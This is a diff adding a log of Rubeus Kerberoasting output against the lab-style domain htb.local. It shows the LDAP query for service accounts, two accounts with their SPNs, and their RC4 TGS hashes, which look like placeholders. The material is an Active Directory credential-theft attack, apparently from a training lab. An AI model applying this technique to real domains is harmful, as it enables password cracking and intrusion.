@@ -1,0 +1,39 @@
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.2
+
+
+[*] Action: Kerberoasting
+
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+
+[*] Target Domain          : htb.local
+[*] Searching path 'LDAP://DC01.htb.local/DC=htb,DC=local' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
+
+[*] Total kerberoastable users : 2
+
+
+[*] SamAccountName         : svc_mssql
+[*] DistinguishedName      : CN=svc_mssql,CN=Users,DC=htb,DC=local
+[*] ServicePrincipalName   : MSSQLSvc/sql01.htb.local:1433
+[*] PwdLastSet             : 2/11/2025 9:02:47 AM
+[*] Supported ETYPES       : RC4_HMAC_DEFAULT
+[*] Hash                   :
+
+$krb5tgs$23$*svc_mssql$HTB.LOCAL$MSSQLSvc/sql01.htb.local:1433@HTB.LOCAL*$A1B2C3D4E5F60718293A4B5C6D7E8F90$c4f2a9b7d31e6058fa2c9d84b17e0356a9f2c8d41b7e6053a2f9c8d47b1e6035a9f2c8d41b7e6053f2a9c8d47b1e6035a9f2c8d41b7e6053a2f9c8d47b1e6035c9f2a8d41b7e6053a2f9c8d47b1e6035a9f2c8d41b7e6053a2f9c8d47b1e6035a2f9c8d41b7e6053a9f2c8d47b1e6035a9f2c8d41b7e6053a2f9c8d47b1e60359f2c8d41b7e6053a2f9c8d47b1e6035a9f2c8d41b7e6053a2f9c8d47b1e6035aa9f2c8d41b7e6053a2f9c8d47b1e6035a9f2c8d41b7e6053a2f9c8d47b1e6035f2c9d84b17e0356a9f2c8d41b7e6053a2f9c8d47b1e6035a9f2c8d41b7e6053a29c8d47b1e6035a9f2c8d41b7e6053a2f9c8d47b1e6035a9f2c8d41b7e6053a2f9c8d47b1e6035a9f2c8d41b7e6053a2f9c8d47b1e6035a2f9c8d41b7e6053a9f2c8d47b1e6035
+
+[*] SamAccountName         : svc_backup
+[*] DistinguishedName      : CN=svc_backup,OU=Service Accounts,DC=htb,DC=local
+[*] ServicePrincipalName   : CIFS/backup.htb.local
+[*] PwdLastSet             : 6/30/2024 4:45:12 PM
+[*] Supported ETYPES       : RC4_HMAC_DEFAULT
+[*] Hash                   :
+
+$krb5tgs$23$*svc_backup$HTB.LOCAL$CIFS/backup.htb.local@HTB.LOCAL*$F0E1D2C3B4A5968778695A4B3C2D1E0F$7b3e6053a2f9c8d47b1e6035a9f2c8d41b7e6053a2f9c8d47b1e6035a9f2c8d41b7e6053a2f9c8d47b1e6035a9f2c8d41b7e6053a2f9c8d47b1e6035a9f2c8d41b7e6053a2f9c8d47b1e6035a9f2c8d41b7e6053a2f9c8d47b1e6035a9f2c8d41b7e6053a2f9c8d47b1e6035a9f2c8d41b7e6053a2f9c8d47b1e6035a9f2c8d41b7e6053a2f9c8d47b1e6035a9f2c8d41b7e6053a2f9c8d47b1e6035a9f2c8d41b7e6053a2f9c8d47b1e6035a9f2c8d41b7e6053a2f9c8d47b1e6035a9f2c8d41b7e6053a2f9c8d47b1e6035a9f2c8d41b7e6053a2f9c8d47b1e6035a9f2c8d41b7e6053a2f9c8d47b1e6035a9f2c8d41b7e6053a2f9c8d47b1e6035a9f2c8d41b7e6053a2f9c8d47b1e6035a9f2c8d41b7e60
